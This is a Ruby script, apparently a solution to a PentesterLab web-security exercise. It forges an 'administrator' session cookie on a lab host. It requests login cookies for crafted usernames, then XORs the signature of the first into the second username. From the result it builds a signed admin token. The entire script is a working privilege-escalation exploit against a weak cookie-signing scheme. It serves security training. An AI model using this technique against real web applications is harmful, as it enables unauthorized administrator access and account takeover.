require 'httparty'
require 'base64'

URL = "http://ptl-4c7cb3a9-bacf6f83.libcurl.so/"
def login(username)
	res = HTTParty.post(URL + 'login.php', body: {username: username, password: 'Password1'}, follow_redirects: false)

	#return auth value
	return res.headers["set-cookie"].split("=")[1]
end

auth = login("administ")
sign1 = Base64.decode64(auth).split("--")[1]

def xor(str1, str2)
	ret = ""
	str1.split(//).each_with_index do |c, i|
		ret[i] = (str1[i].ord ^ str2[i].ord).chr
	end
	return ret
end

username2 = xor("rator\00\00\00", sign1)
auth2 = login(username2).gsub("%2B", "+")
sign2 = Base64.decode64(auth2).split("--")[1]

puts URI.escape(Base64.encode64("administrator--#{(sign2)}"), "=")